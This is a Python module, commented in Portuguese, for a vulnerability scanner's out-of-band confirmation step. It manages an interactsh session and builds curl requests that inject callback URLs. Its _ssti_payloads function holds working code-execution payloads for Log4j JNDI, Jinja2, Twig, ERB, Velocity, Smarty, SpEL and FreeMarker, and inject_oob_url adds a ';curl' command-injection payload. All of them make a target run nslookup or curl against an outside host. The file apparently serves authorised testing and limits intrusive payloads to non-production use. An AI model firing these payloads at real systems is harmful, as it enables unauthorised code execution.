#!/usr/bin/env python3
"""
oob.py — Confirmação Out-of-Band (OAST) via interactsh-client.

Gerencia uma sessão interactsh: registra um domínio, gera payloads únicos
correlacionáveis e coleta callbacks (DNS/HTTP/SMTP) do alvo. Um callback
correlacionado é prova determinística de SSRF/RCE/SSTI cego — onde assinatura
e diff de resposta falham.

Privacidade/RoE: por padrão NÃO usa os servidores públicos da ProjectDiscovery
(oast.pro etc.). Usá-los vazaria callbacks do alvo para infra de terceiros.
Exige INTERACTSH_SERVER (self-hosted) explícito; sem isso a sessão fica
desabilitada e o pipeline degrada sem erro.

Uso típico:
    oob = OOBSession()
    if oob.start():
        token, url = oob.new_payload("ssrf")
        # ... injetar `url` no alvo ...
        time.sleep(20)
        if oob.matches(token):
            # confirmado
        oob.stop()
"""
import json
import os
import re
import secrets
import shlex
import shutil
import subprocess
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Linha de domínio registrado impressa pelo interactsh-client no startup,
# ex.: "c8x...k2.oast.example.com". 20+ chars de correlation-id + sufixo.
_HOST_RE = re.compile(r'^([a-z0-9]{20,}\.[a-z0-9.\-]+)\s*$', re.IGNORECASE)

# Parâmetros que comumente carregam uma URL alvo de SSRF.
_SSRF_PARAMS = ["url", "uri", "path", "dest", "redirect", "target", "host",
                "callback", "webhook", "image", "img", "src", "feed",
                "proxy", "u", "next", "data", "out"]


class OOBSession:
    """Sessão interactsh-client para confirmação OOB."""

    def __init__(self, server=None, token=None, out_dir="/tmp"):
        self.server  = server or os.environ.get("INTERACTSH_SERVER", "")
        self.token   = token  or os.environ.get("INTERACTSH_TOKEN", "")
        self.enabled = bool(self.server) and shutil.which("interactsh-client") is not None
        self.domain  = None
        self.proc    = None
        self._jsonl  = os.path.join(out_dir, f"oob_{os.getpid()}.jsonl")
        self._seen   = set()   # unique-ids já processados (evita reprocessar)

    def start(self, register_timeout=12):
        """Sobe o client e captura o domínio registrado. True se pronto."""
        if not self.enabled:
            return False
        try:
            os.makedirs(os.path.dirname(self._jsonl), exist_ok=True)
        except OSError:
            return False
        cmd = ["interactsh-client", "-json", "-o", self._jsonl, "-s", self.server]
        if self.token:
            cmd += ["-t", self.token]
        try:
            self.proc = subprocess.Popen(
                cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                text=True, bufsize=1)
        except (OSError, ValueError):
            return False

        # O domínio registrado é impresso em texto puro no startup.
        deadline = time.time() + register_timeout
        while time.time() < deadline:
            line = self.proc.stdout.readline()
            if not line:
                if self.proc.poll() is not None:
                    break
                continue
            m = _HOST_RE.match(line.strip())
            if m:
                self.domain = m.group(1)
                return True
        self.stop()
        return False

    def new_payload(self, label="oob"):
        """Retorna (token, url) único, correlacionável a um finding."""
        if not self.domain:
            raise RuntimeError("OOBSession não iniciada (sem domínio registrado)")
        clean = re.sub(r'[^a-z0-9]', '', label.lower())[:12] or "oob"
        token = f"{clean}{secrets.token_hex(6)}"
        host  = f"{token}.{self.domain}"
        return token, f"http://{host}/"

    def collect(self):
        """Lê interações ainda não vistas do arquivo JSONL do client."""
        if not os.path.exists(self._jsonl):
            return []
        out = []
        try:
            with open(self._jsonl, errors="replace") as f:
                for line in f:
                    line = line.strip()
                    if not line:
                        continue
                    try:
                        it = json.loads(line)
                    except json.JSONDecodeError:
                        continue
                    uid = it.get("unique-id", "") + it.get("timestamp", "")
                    if uid in self._seen:
                        continue
                    self._seen.add(uid)
                    out.append(it)
        except OSError:
            return []
        return out

    def matches(self, token):
        """Interações cujo full-id/raw-request contém o token deste payload."""
        token = token.lower()
        hits = []
        for it in self.collect():
            blob = (str(it.get("full-id", "")) + str(it.get("raw-request", ""))).lower()
            if token in blob:
                hits.append(it)
        return hits

    def stop(self):
        """Encerra o client e remove o arquivo temporário."""
        if self.proc and self.proc.poll() is None:
            self.proc.terminate()
            try:
                self.proc.wait(timeout=5)
            except subprocess.TimeoutExpired:
                self.proc.kill()
        self.proc = None
        try:
            os.remove(self._jsonl)
        except OSError:
            pass


def _ssti_payloads(host):
    """Payloads SSTI para múltiplas engines de template. TODOS resolvem `host`
    (via DNS lookup ou fetch HTTP) → callback OOB, sem importar qual engine
    processou. Cobertura: Log4j, Jinja2, Twig, ERB, Velocity, Smarty, Spring
    SpEL, FreeMarker.

    Os payloads são intencionalmente curtos para caber em parâmetros pequenos
    e usam só caracteres ASCII para evitar problemas de encoding.
    """
    # Log4Shell / JNDI lookup (Java/log4j ≤ 2.16)
    yield "${jndi:ldap://%s/x}" % host
    # Jinja2 / Flask — popen('nslookup host')
    yield ("{{''.__class__.__base__.__subclasses__()[0].__init__.__globals__"
           "['os'].popen('nslookup %s').read()}}") % host
    # Twig (Symfony) — registra exec e chama com nslookup
    yield ('{{_self.env.registerUndefinedFilterCallback("exec")}}'
           '{{_self.env.getFilter("nslookup %s")}}') % host
    # ERB (Rails) — backticks
    yield "<%%= `nslookup %s` %%>" % host
    # Velocity (Apache/Java) — Runtime.exec
    yield "#set($e=$rt.getRuntime().exec(['nslookup','%s']))" % host
    # Smarty (PHP) — system()
    yield "{system('nslookup %s')}" % host
    # Spring SpEL — T(Runtime).getRuntime().exec
    yield ('${T(java.lang.Runtime).getRuntime().exec(new String[]{"nslookup","%s"})}'
           ) % host
    # FreeMarker — Execute().eval()
    yield ('<#assign x="freemarker.template.utility.Execute"?new()>'
           '${x("nslookup %s")}') % host


def inject_oob_url(matched_url, oob_url, vuln_type, profile="lab"):
    """
    Devolve uma LISTA de comandos curl que injetam `oob_url` no ponto provável
    de SSRF/RCE/SSTI. Lista vazia quando o tipo não se aplica ou o perfil não
    autoriza. Para SSTI, retorna múltiplos payloads (um por engine de template).

    - ssrf: injeta a URL OOB em parâmetros candidatos (não intrusivo).
    - rce/ssti: payloads intrusivos — só lab/staging, nunca production.
    """
    if vuln_type == "ssrf":
        parsed = urlparse(matched_url)
        qs = parse_qs(parsed.query, keep_blank_values=True)
        if qs:
            candidates = [k for k in qs if k.lower() in _SSRF_PARAMS]
            for k in (candidates or [next(iter(qs))]):
                qs[k] = [oob_url]
            target = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        else:
            sep = "&" if "?" in matched_url else "?"
            target = f"{matched_url}{sep}url={oob_url}"
        return [f"curl -sk -L --max-time 12 {shlex.quote(target)}"]

    if vuln_type not in ("rce", "ssti"):
        return []
    if profile == "production":
        return []  # intrusivo — proibido em produção
    host = urlparse(oob_url).hostname or ""
    if not host:
        return []

    sep = "&" if "?" in matched_url else "?"

    if vuln_type == "rce":
        # Command injection cego: faz o alvo resolver/baixar a URL OOB.
        payload = f";curl {shlex.quote(oob_url)};"
        target  = f"{matched_url}{sep}q={payload}"
        return [f"curl -sk -L --max-time 12 {shlex.quote(target)}"]

    # ssti — cobre múltiplas engines (Log4j, Jinja2, Twig, ERB, Velocity,
    # Smarty, SpEL, FreeMarker). Cada engine ignora o que não entende.
    cmds = []
    for payload in _ssti_payloads(host):
        target = f"{matched_url}{sep}q={payload}"
        cmds.append(f"curl -sk -L --max-time 12 {shlex.quote(target)}")
    return cmds
